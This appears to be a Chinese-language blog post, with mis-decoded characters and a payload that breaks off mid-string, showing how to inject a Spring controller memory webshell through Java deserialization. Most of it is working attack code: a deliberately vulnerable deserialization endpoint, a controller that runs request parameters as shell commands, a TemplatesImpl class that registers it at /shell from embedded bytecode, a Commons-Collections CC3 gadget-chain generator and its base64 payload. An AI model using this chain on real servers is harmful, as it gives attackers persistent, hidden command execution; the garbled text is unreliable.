id="å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬"><a href="#å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬" class="headerlink" title="å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬"></a>å®æˆ˜ä¸­ååºåˆ—åŒ–åˆ©ç”¨å†…å­˜é©¬</h1><p>å‰é¢çš„å†™æ³•è¿˜ä¸èƒ½æ»¡è¶³å®æˆ˜åˆ©ç”¨ï¼Œå®æˆ˜ä¸­é€šå¸¸ç»“åˆååºåˆ—åŒ–çš„å½¢å¼ï¼Œä¸è¿‡æ”¹æˆå®æˆ˜åˆ©ç”¨ä¹Ÿè›®ç®€å•çš„ï¼Œå°±æ˜¯ç»“åˆé“¾å­æ¯”å¦‚TemplatesImplé‡Œçš„æ¶æ„ç±»ä»£ç å°±æ˜¯æˆ‘ä»¬å‰é¢æ‰€å†™çš„çš„æ¶æ„ä»£ç </p><p>å…ˆå†™ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–æ¼æ´çš„è·¯ç”±</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnContorller</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(value = &#123;&quot;/des&quot;&#125;, method = &#123;RequestMethod.POST&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;base64Data&quot;)</span> String base64Data)</span> &#123;<br>        System.out.println(base64Data);<br>        <span class="hljs-type">byte</span>[] serializedData = Base64.getMimeDecoder().decode(base64Data);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> deserializeData(serializedData);<br>        <span class="hljs-keyword">return</span> option;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">deserializeData</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] serializedData)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serializedData);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>            ois.readObject();<br>            ois.close();<br>            bis.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ååºåˆ—åŒ–åˆ©ç”¨controller"><a href="#ååºåˆ—åŒ–åˆ©ç”¨Controller" class="headerlink" title="ååºåˆ—åŒ–åˆ©ç”¨Controller"></a>ååºåˆ—åŒ–åˆ©ç”¨Controller</h2><p>æˆ‘ä»¬è¦æ³¨å†Œçš„controller</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯TemplatesImplæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ControllerBehind</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//åŠ è½½magicControllerç±»çš„å­—èŠ‚ç </span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>            System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        Method mm = (Class.forName(&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;).getDeclaredMethods())[0];</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>            rs.registerMapping(info, instance, mm);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®æŠŠå‰é¢çš„æ‹¿æ¥å¤ç”¨ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œåªä¸è¿‡è¿™é‡Œå†æŠŠæµç¨‹å®Œæ•´è®°å½•ä¸€ä¸‹</p><p>ç„¶åæœ¬åœ°åŠ äº†ä¸€ä¸ªccä¾èµ–ï¼Œç”¨cc3æ¥æ‰“å…¥å†…å­˜é©¬è¿›è¡Œæµ‹è¯•</p><p>cc3expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Chain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;ControllerBehind.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//è¿™é‡Œçš„èµ‹å€¼åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±ä¸éœ€è¦äº†</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//ç»“åˆå‰é¢çš„é“¾å­ä¸²è”èµ·æ¥ï¼Œéšä¾¿ä¸€ä¸ªéƒ½è¡Œ</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆçš„base64å­—ç¬¦ä¸²</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAfc8r+ur4AAAA0AMgKAC4AYwgAZAcAZQoAAwBjCgADAGYHAGcIAGgHAGkHAGoHAEgJAGsAbAoACABtCgBuAG8KAHAAcQoAcAByBwBzCAB0CgBrAHUKAG4AdgoACAB3CgB4AHkJAHoAewcAfAoAFwBjCAB9CgAXAH4KABcAfwoAFwCACgCBAIIKAIMAhAgAhQsAhgCHBwCIBwCJCACKCgAiAIsHAIwKACUAjQcAjgsAIQCPCgAIAJAKACcAkQcAkgoAKwCTBwCUBwCVAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2Nsb3duL0NvbnRyb2xsZXJCZWhpbmQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAJYBABBNZXRob2RQYXJhbWV0ZXJzAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEABGNvZGUBABJ